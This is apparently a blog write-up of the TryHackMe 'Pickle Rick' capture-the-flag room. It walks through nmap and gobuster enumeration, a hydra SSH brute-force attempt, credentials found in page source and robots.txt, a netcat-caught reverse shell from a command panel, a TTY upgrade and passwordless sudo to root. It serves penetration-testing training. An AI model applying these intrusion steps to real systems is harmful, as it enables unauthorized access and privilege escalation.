---
layout: single
title: THM - Pickle Rick
date: 2025-11-09
classes: wide
header:
  teaser: /assets/images/thm-pickle-rick/logo.png
  teaser_home_page: true
categories:
  - TryHackMe
  - Easy
  - Linux
tags:
  - password-bruteforcing
  - rce
---

# Introduction
-------------

This writeup documents the penetration testing of the [**Pickle Rick**](https://tryhackme.com/room/picklerick) machine from the [**TryHackMe**](https://tryhackme.com/) platform. In this case I'll try to log into a panel which is vulnerable to command injection and I'll find the 3 ingredients the CTF wants us to submit.

<br>
# Information Gathering
------------------

After identifying the target's IP address, we need to enumerate as  much information as possible about the host. A quick way to get a hint of the OS is checking the TTL value from a simple ping to a host on our local network. [**ttl-ripper.sh**](https://github.com/Akronox/WichSystem.py) can also be used for this purpose.
* TTL 64: Linux.
* TTL 128: Windows.

```
❯ ping -c 1 10.10.195.20
PING 10.10.195.201 (10.10.195.201) 56(84) bytes of data.
64 bytes from 10.10.195.201: icmp_seq=1 ttl=63 time=55.0 ms

--- 10.10.195.201 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 54.986/54.986/54.986/0.000 ms
```

In this case, it seems to be a Linux machine. Let's perform some scans.

```
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.195.201 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-08 22:26 CET
Initiating SYN Stealth Scan at 22:26
Scanning 10.10.195.201 [65535 ports]
Discovered open port 80/tcp on 10.10.195.201
Discovered open port 22/tcp on 10.10.195.201
Completed SYN Stealth Scan at 22:27, 18.76s elapsed (65535 total ports)
Nmap scan report for 10.10.195.201
Host is up, received user-set (0.10s latency).
Scanned at 2025-11-08 22:26:54 CET for 19s
Not shown: 58858 closed tcp ports (reset), 6675 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 18.85 seconds
           Raw packets sent: 92355 (4.064MB) | Rcvd: 59949 (2.398MB)
```

```
❯ nmap -sCV -p22,80 10.10.195.201 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-08 22:36 CET
Nmap scan report for 10.10.195.201
Host is up (0.057s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9d:e6:20:e8:e1:4c:fb:68:a8:d2:6b:1c:8c:85:67:2f (RSA)
|   256 4e:2f:e7:59:d4:e1:7c:40:47:ea:65:59:cb:49:bf:8c (ECDSA)
|_  256 a6:f7:75:6e:d1:c8:94:09:70:91:dd:43:f9:03:1e:f3 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Rick is sup4r cool
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.95 seconds
```

Nmap found some open ports. The intrusion is probably going to be, or at least start, from port 80. You can Google the Apache or SSH version followed by “launchpad” to get a good hint about the OS. You can also check the blog’s [Enumeration Cheat Sheet](https://pwnerguy.github.io/enumeration-cheatsheet/), which includes a table mapping service versions to possible operating system versions We are facing an **Ubuntu Focal**.

We can't do much with the SSH service since we don't have credentials yet. Now it's time to enumerate the web server running on the port 80:

```
whatweb http://10.10.195.201
http://10.10.195.201 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.195.201], JQuery, Script, Title[Rick is sup4r cool]
```

![](/assets/images/thm-pickle-rick/web.png)

Let's take a look in the source code.

```html
<!-- 

	Note to self, remember username! 
	
	Username: R1ckRul3s 

-->
```

**Morty** need us to *BURP* and find 3 ingredients. We have a username: ``R1ckRul3s``

```
❯ hydra -l R1ckRul3s -P /usr/share/wordlists/rockyou.txt 10.10.195.201 ssh
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-08 22:48:15
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.195.201:22/
[ERROR] target ssh://10.10.195.201:22/ does not support password authentication (method reply 4).
```

But the machine doesn't support password authentication, I think it's using SSH key based auth.

```
❯ gobuster dir -u http://10.10.195.201/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x txt,xml,php,bak
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.195.201/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              txt,xml,php,bak
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login.php            (Status: 200) [Size: 882]
/assets               (Status: 301) [Size: 315] [--> http://10.10.195.201/assets/]
/portal.php           (Status: 302) [Size: 0] [--> /login.php]
/robots.txt           (Status: 200) [Size: 17]
/denied.php           (Status: 302) [Size: 0] [--> /login.php]
/server-status        (Status: 403) [Size: 278]
/clue.txt             (Status: 200) [Size: 54]
Progress: 1102785 / 1102785 (100.00%)
===============================================================
Finished
===============================================================
```

<br>
# Vulnerability Assessment
-------

Gobuster found some interesting files.

![](/assets/images/thm-pickle-rick/robots.png)

We got the **credentials**  ``R1ckRul3s:Wubbalubbadubdub``, if you put them in login.php, you'll access a **Command Panel**. 

![](/assets/images/thm-pickle-rick/clue.png)

<br>
# Exploitation
-------

Let's try to get a reverse shell.

```
❯ nc -nvlp 443
listening on [any] 443 ...
connect to [10.8.78.182] from (UNKNOWN) [10.10.39.70] 58178
bash: cannot set terminal process group (1001): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ip-10-10-39-70:/var/www/html$ whoami
www-data
```

<br>
# Post-Exploitation
------

TTY upgrading:

```
❯ script /dev/null -c bash
❯ Ctrl+Z
❯ stty raw -echo; fg
❯ reset xterm
❯ export TERM=xterm
❯ export SHELL=bash
❯ stty rows 44 columns 185
```

Finally, we need to find those 3 ingredients and submit them.

```
www-data@ip-10-10-39-70:/var/www/html$ cat Sup3rS3cretPickl3Ingred.txt 
***REDACTED***
www-data@ip-10-10-39-70:/home/rick$ cat second\ ingredients 
***REDACTED***
www-data@ip-10-10-39-70:/home/ubuntu$ sudo -l
Matching Defaults entries for www-data on ip-10-10-39-70:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-39-70:
    (ALL) NOPASSWD: ALL
www-data@ip-10-10-39-70:/home/ubuntu$ sudo su
root@ip-10-10-39-70:~# cat /root/3rd.txt 
3rd ingredients: ***REDACTED***
```
